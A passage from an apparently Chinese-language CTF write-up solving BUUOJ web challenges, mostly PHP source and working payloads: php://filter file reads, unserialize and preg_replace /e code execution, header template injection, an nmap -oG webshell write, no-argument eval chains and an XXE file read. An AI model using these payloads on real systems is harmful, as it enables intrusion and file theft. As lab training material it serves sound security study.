</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($file))
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;woofers&#34;</span> ) <span style=color:#f92672>!==</span>  <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;meowers&#34;</span> ) <span style=color:#f92672>!==</span>  <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;index&#34;</span>)){
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>include</span> ($file <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>);
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Sorry, we currently only support woofers and meowers.&#34;</span>;
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://8c9c7563-317a-447e-a45f-9dbb7bb6613c.node5.buuoj.cn:81/index.php?category<span style=color:#f92672>=</span>php://filter/convert.base64-encode/index/resource<span style=color:#f92672>=</span>flag
</span></span></code></pre></div><p>base64è§£å¯†</p><h2 id=ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>æŠ“åŒ…çœ‹</p><pre tabindex=0><code>POST /index.php HTTP/1.1
Host: c8d1e70e-ba6e-47e5-8eea-1fb2003db2ff.node5.buuoj.cn:81
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Origin: http://c8d1e70e-ba6e-47e5-8eea-1fb2003db2ff.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://c8d1e70e-ba6e-47e5-8eea-1fb2003db2ff.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Content-Length: 29

func=date&amp;p=Y-m-d+h%3Ai%3As+a
</code></pre><p>å¥½åƒè¿‡æ»¤äº†systemå’Œinclude</p><pre tabindex=0><code>func=file_get_contents&amp;p=php://filter/convert.base64-encode/resource=index.php
</code></pre><p>æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    $disable_fun <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#e6db74>&#34;shell_exec&#34;</span>,<span style=color:#e6db74>&#34;system&#34;</span>,<span style=color:#e6db74>&#34;passthru&#34;</span>,<span style=color:#e6db74>&#34;proc_open&#34;</span>,<span style=color:#e6db74>&#34;show_source&#34;</span>,<span style=color:#e6db74>&#34;phpinfo&#34;</span>,<span style=color:#e6db74>&#34;popen&#34;</span>,<span style=color:#e6db74>&#34;dl&#34;</span>,<span style=color:#e6db74>&#34;eval&#34;</span>,<span style=color:#e6db74>&#34;proc_terminate&#34;</span>,<span style=color:#e6db74>&#34;touch&#34;</span>,<span style=color:#e6db74>&#34;escapeshellcmd&#34;</span>,<span style=color:#e6db74>&#34;escapeshellarg&#34;</span>,<span style=color:#e6db74>&#34;assert&#34;</span>,<span style=color:#e6db74>&#34;substr_replace&#34;</span>,<span style=color:#e6db74>&#34;call_user_func_array&#34;</span>,<span style=color:#e6db74>&#34;call_user_func&#34;</span>,<span style=color:#e6db74>&#34;array_filter&#34;</span>, <span style=color:#e6db74>&#34;array_walk&#34;</span>,  <span style=color:#e6db74>&#34;array_map&#34;</span>,<span style=color:#e6db74>&#34;registregister_shutdown_function&#34;</span>,<span style=color:#e6db74>&#34;register_tick_function&#34;</span>,<span style=color:#e6db74>&#34;filter_var&#34;</span>, <span style=color:#e6db74>&#34;filter_var_array&#34;</span>, <span style=color:#e6db74>&#34;uasort&#34;</span>, <span style=color:#e6db74>&#34;uksort&#34;</span>, <span style=color:#e6db74>&#34;array_reduce&#34;</span>,<span style=color:#e6db74>&#34;array_walk&#34;</span>, <span style=color:#e6db74>&#34;array_walk_recursive&#34;</span>,<span style=color:#e6db74>&#34;pcntl_exec&#34;</span>,<span style=color:#e6db74>&#34;fopen&#34;</span>,<span style=color:#e6db74>&#34;fwrite&#34;</span>,<span style=color:#e6db74>&#34;file_put_contents&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>gettime</span>($func, $p) {
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>call_user_func</span>($func, $p);
</span></span><span style=display:flex><span>        $a<span style=color:#f92672>=</span> <span style=color:#a6e22e>gettype</span>($result);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $result;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;}
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Y-m-d h:i:s a&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;date&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $func <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;func&#34;</span>];
</span></span><span style=display:flex><span>    $p <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;p&#34;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($func <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>        $func <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>($func);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($func,$disable_fun)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($func, $p);
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Hacker...&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h3 id=è§£é¢˜1-5>è§£é¢˜1</h3><pre tabindex=0><code>func=\system&amp;p=cat /tmp/flagoefiu4r93
</code></pre><p>phpå†…çš„" \ &ldquo;åœ¨åšä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šè¯†åˆ«ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚</p><h3 id=è§£é¢˜2-5>è§£é¢˜2</h3><p>æ³¨æ„åˆ°äº†<code>__destruct()</code>ï¼Œé‚£æˆ‘ä»¬å¦‚æœååºåˆ—åŒ–ä¸€ä¸ªç±»ï¼Œåœ¨ç±»é‡Œçš„å‚æ•°ä¸­å†™ä¸Šæˆ‘ä»¬è¦æ‰§è¡Œçš„ä»£ç å’Œå‡½æ•°ï¼Œè¿™æ ·çš„è¯å°±ä¼šç›´æ¥è°ƒç”¨gettimeå‡½æ•°ï¼Œè€Œä¸ä¼šæ‰§è¡Œ<code>in_array($func,$disable_fun)</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ls&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;system&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>$test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
</span></span><span style=display:flex><span>$str <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($test);
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>($str);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>func<span style=color:#f92672>=</span>unserialize&amp;p<span style=color:#f92672>=</span>O:4:<span style=color:#e6db74>&#34;Test&#34;</span>:2:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;p&#34;</span>;s:2:<span style=color:#e6db74>&#34;ls&#34;</span>;s:4:<span style=color:#e6db74>&#34;func&#34;</span>;s:6:<span style=color:#e6db74>&#34;system&#34;</span>;<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>å‰©ä¸‹çš„æ€è·¯ä¸€è‡´ï¼Œæ‰¾flagå°±è¡Œ</p><h2 id=bjdctf2020the-mystery-of-ip>[BJDCTF2020]The mystery of ip</h2><p>phpçš„æ¨¡æ¿æ³¨å…¥ï¼Œåˆ©ç”¨</p><pre tabindex=0><code>X-Forwarded-For:{system(&#39;cat /flag&#39;)}
</code></pre><p>å¾—åˆ°flag</p><h2 id=bjdctf2020zjctfä¸è¿‡å¦‚æ­¤>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>$text <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;text&#34;</span>];
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;file&#34;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($text)<span style=color:#f92672>&amp;&amp;</span>(<span style=color:#a6e22e>file_get_contents</span>($text,<span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>===</span><span style=color:#e6db74>&#34;I have a dream&#34;</span>)){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>file_get_contents</span>($text,<span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>,$file)){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Not now!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>include</span>($file);  <span style=color:#75715e>//next.php
</span></span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://757fdeb5-f4d3-4fdb-90f5-9ddb7a1b9137.node5.buuoj.cn:81/?text<span style=color:#f92672>=</span>data://text/plain,I have a dream&amp;file<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>next.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;id&#39;</span>] <span style=color:#f92672>=</span> $id;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>complex</span>($re, $str) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>(
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;/(&#39;</span> <span style=color:#f92672>.</span> $re <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;)/ei&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;strtolower(&#34;\\1&#34;)&#39;</span>,
</span></span><span style=display:flex><span>        $str
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $re <span style=color:#f92672>=&gt;</span> $str) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>complex</span>($re, $str)<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getFlag</span>(){
</span></span><span style=display:flex><span>	<span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);
</code></pre><p>å‚è€ƒ<a href=https://xz.aliyun.com/news/2239>æ–‡ç«  - æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id=buuctf-2018online-tool>[BUUCTF 2018]Online Tool</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
</span></span><span style=display:flex><span>    $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>] <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;host&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $host <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;host&#39;</span>];
</span></span><span style=display:flex><span>    $host <span style=color:#f92672>=</span> <span style=color:#a6e22e>escapeshellarg</span>($host);
</span></span><span style=display:flex><span>    $host <span style=color:#f92672>=</span> <span style=color:#a6e22e>escapeshellcmd</span>($host);
</span></span><span style=display:flex><span>    $sandbox <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#34;glzjin&#34;</span><span style=color:#f92672>.</span> $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;you are in sandbox &#39;</span><span style=color:#f92672>.</span>$sandbox;
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>mkdir</span>($sandbox);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>chdir</span>($sandbox);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span style=color:#f92672>.</span>$host);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li><code>escapeshellarg()</code>å°†è¾“å…¥ç”¨å•å¼•å·åŒ…è£¹å¹¶è½¬ä¹‰å†…éƒ¨å•å¼•å·ï¼ˆ<code>'</code> â†’ <code>'\''</code>ï¼‰ã€‚</li><li><code>escapeshellcmd()</code>è½¬ä¹‰Shellå…ƒå­—ç¬¦ï¼ˆå¦‚<code>;</code>ã€<code>|</code>ç­‰ï¼‰ã€‚</li></ul><p>123</p><pre tabindex=0><code>http://339d09df-10f8-466c-a64e-35756b919004.node5.buuoj.cn:81/?host=&#39;&lt;?php echo `cat /flag`;?&gt;-oG test.php &#39;
</code></pre><pre tabindex=0><code>e6305cd14dbe6e1fc4041d81cb3fc9ee/test.php
</code></pre><h2 id=gxyctf2019ç¦æ­¢å¥—å¨ƒ>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  { Â  Â  Â  Â  Â  Â  <span style=color:#75715e>//ä¸å…è®¸ä½¿ç”¨phpåè®®
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  <span style=color:#66d9ef>if</span>(<span style=color:#e6db74>&#39;;&#39;</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/[a-z,_]+\((?R)?\)/&#39;</span>, <span style=color:#66d9ef>NULL</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  { Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style=color:#75715e>//æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼ŒåŒ¹é…çš„å½¢å¼æ˜¯å½¢å¦‚a();çš„æ— å‚æ•°çš„è¡¨è¾¾å¼
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  {
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style=color:#75715e>// echo $_GET[&#39;exp&#39;];
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  }
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;è¿˜å·®ä¸€ç‚¹å“¦ï¼&#34;</span>);
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  }
</span></span><span style=display:flex><span>Â  Â  Â  Â  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  Â  Â  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;å†å¥½å¥½æƒ³æƒ³ï¼&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  Â  Â  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  {
</span></span><span style=display:flex><span>Â  Â  Â  Â  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Â  Â  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// highlight_file(__FILE__);
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?exp<span style=color:#f92672>=</span>print_r<span style=color:#f92672>(</span>scandir<span style=color:#f92672>(</span>pos<span style=color:#f92672>(</span>localeconv<span style=color:#f92672>())))</span>;
</span></span></code></pre></div><pre tabindex=0><code>?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
</code></pre><h2 id=nctf2019fake-xml-cookbook>[NCTF2019]Fake XML cookbook</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>POST /doLogin.php HTTP/1.1
</span></span><span style=display:flex><span>Host: de87a51a-a84c-4e25-b469-c832f6bb2411.node5.buuoj.cn:81
</span></span><span style=display:flex><span>X-Requested-With: XMLHttpRequest
</span></span><span style=display:flex><span>Content-Type: application/xml;charset=UTF-8
</span></span><span style=display:flex><span>Origin: http://de87a51a-a84c-4e25-b469-c832f6bb2411.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Accept: application/xml, text/xml, */*; q=0.01
</span></span><span style=display:flex><span>Referer: http://de87a51a-a84c-4e25-b469-c832f6bb2411.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
</span></span><span style=display:flex><span>Content-Length: 61
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;creds&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;username&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/username&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;password&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/password&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/creds&gt;</span>
</span></span></code></pre></div><h2 id=gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>çœ‹robots.txt</p><pre tabindex=0><code>User-agent: *
Disallow: phpinfo.php
</code></pre><pre tabindex=0><code>PHP Version 7.2.24-0ubuntu0.18.04.1
</code></pre><p>æ‰«æåˆ°å­˜åœ¨<code>phpmyadmin</code>æ•°æ®åº“ç®¡ç†é¡µé¢</p><pre tabindex=0><code>http://c09e4207-6d8b-462c-ab7e-4c7fa1e59dfc.node5.buuoj.cn:81/phpmyadmin/index.php
